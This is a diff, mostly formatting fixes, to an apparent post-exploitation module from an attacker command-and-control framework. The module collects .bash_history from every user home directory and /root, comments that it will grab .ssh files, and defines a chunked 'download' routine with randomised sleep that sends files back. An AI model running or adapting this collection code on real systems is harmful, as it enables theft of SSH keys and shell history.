@@ -29,6 +29,7 @@ options:
     value: 'False'
 script: |
   import os
+
   # custom function to send download packets back
   def downloadFile(path):
       import os
@@ -46,7 +47,7 @@ script: |
               # get 512kb of the given file starting at the specified offset
               encodedPart = get_file_part(filePath, offset)
 
-              partData = "%%s|%%s|%%s" %%(partIndex, filePath, encodedPart)
+              partData = "%%s|%%s|%%s" % (partIndex, filePath, encodedPart)
 
               if not encodedPart or encodedPart == '': break
 
@@ -56,26 +57,27 @@ script: |
               if "{{ Sleep }}".lower() == "true":
                   global minSleep
                   global maxSleep
-                  minSleep = (1.0-jitter)*delay
-                  maxSleep = (1.0+jitter)*delay
+                  minSleep = (1.0 - jitter) * delay
+                  maxSleep = (1.0 + jitter) * delay
                   sleepTime = random.randint(minSleep, maxSleep)
                   time.sleep(sleepTime)
 
               partIndex += 1
               offset += 5120000
 
+
   searchPaths = ['/.bash_history']
 
   if "{{ AllUsers }}".lower() == "true":
-      d='/home/'
-      userPaths = [os.path.join(d,o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
+      d = '/home/'
+      userPaths = [os.path.join(d, o) for o in os.listdir(d) if os.path.isdir(os.path.join(d, o))]
       userPaths += ["/root/"]
   else:
       userPaths = ['~/']
 
   for userPath in userPaths:
       for searchPath in searchPaths:
-          #downloadFile(userPath + searchPath)
+          # downloadFile(userPath + searchPath)
           print(userPath + searchPath)
 
       # grab all .ssh files
